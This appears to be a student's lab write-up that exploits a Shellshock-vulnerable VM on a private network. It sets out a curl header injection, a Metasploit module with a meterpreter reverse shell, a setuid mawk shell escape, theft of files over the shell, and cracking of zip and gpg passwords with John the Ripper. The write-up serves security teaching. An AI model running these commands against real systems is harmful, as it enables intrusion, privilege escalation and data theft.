Name:
GT Login ID: skhadka9

Task 1: 
To see my kali Ip address, I use "ifconfig" which give "10.0.2.15". Then I use "nmap -sn 10.0.2.15/24" to scan the local NAT network and find the IP address of shellshock server ("10.0.2.4"). After that, to identify the open ports on the shellshock server, I use "nmap -sV 10.0.2.4" and It lists all the open ports, contain apache web server runs on port 80 which receives http traffic on the vulnerable VM.

Task 2:
After identifying the IP address and HTTP port of the vulnerable Shellshock VM from Task 1, now I am able to access the CGI program by navigating to "http://10.0.2.4:80/cgi-bin/shellshock.cgi" url. But to exploit the shellshock, I need to craft a special payload and pass it via HTTP headers, as the CGI script will invoke the shell and is vulnerable to injection through the Shellshock exploit. 
I use "curl -H 'User-Agent: () { :; };  echo; /bin/task2 skhadka9' bash -s :'' http://10.0.2.4:80/cgi-bin/shellshock.cgi" to inject the command and get the hash value. 

Task 3:
I use "msfconsole" to start the metasploit framework console, Then use "search shellshock" command to search modile that exploits the vulnerability on Apache as a resulit I found "exploit/multi/http/apache_mod_cgi_bash_env_exec" module specific to Apache. I use this module by using command "use exploit/multi/http/apache_mod_cgi_bash_env_exec". After that I set the 
RHOSTS  and TARGETURI with "10.0.2.4" and "/cgi-bin/shellshock.cgi"respectively. I then listed available payloads with "show payloads" command to find a paylaod that will establish a reverse TCP shell and choose "linux/x86/meterpreter/reverse_tcp". After running the exploit, I successfully spawned a reverse shell and executed /bin/task3 to retrieve the hash value.

Task 4:
In the same metasploit terminal, I use "find /usr/bin -perm -4000 -exec ls -l {} \;" to find the program with the vulnerable setUID bit that returns "-rwsr-xr-x 1 shellshock_server root 106680 Mar 24  2012 mawk". so mawk is the vulnerable program in /usr/bin. Then, I use mawk 'BEGIN {system("/bin/sh")}' command to break out from restricted environment by spawning an interactive system shell. I then retrieved the hash value by running /bin/task4.

Links that helps me:
- https://gtfobins.github.io/gtfobins/find/
- https://gtfobins.github.io/gtfobins/awk/

Task 5:
For this task, I use "payload/linux/x86/meterpreter/reverse_tcp" payload which establish a reverse TCP connection to the target system. Then run the exploit and able to navigate to directory and download the requires file using following commands:
- cd /home/shellshock_server/secret_files/
- download task51.zip /path/to/save/task51.zip
- download task52.pyc.gpg /path/to/save/task52.pyc.gpg

To extract the password hashes from task51.zip and task52.pyc.gpg, I used following command:
For task51.zip: /usr/sbin/zip2john task51.zip > task51.hash
For task52.pyc.gpg: /usr/sbin/gpg2john task52.pyc.gpg > task52.hash

To crack the password for task51.zip, I use "/usr/sbin/john --incremental task51.hash" command and it gives me a password "rt76y" which is used to decrypt the file. After that I run "python2.7 task51.pyc skhadka9" to get the hash value for task51.pyc.

To generate a wordlist and find the password for task52.pyc.gpg, I use following command.
- cewl http://10.0.2.4/cgi-bin/shellshock.cgi -d 13 -o -w wordlist.txt
- /usr/sbin/john --wordlist=~/Desktop/wordlist.txt --rules task52.hash

I got "Neuroscience9" as a password and which is used to decrypt the file usining "gpg --decrypt task52.pyc.gpg > task52.pyc". After that I run "python2.7 task52.pyc skhadka9" to get the hash value for task52.pyc.

  

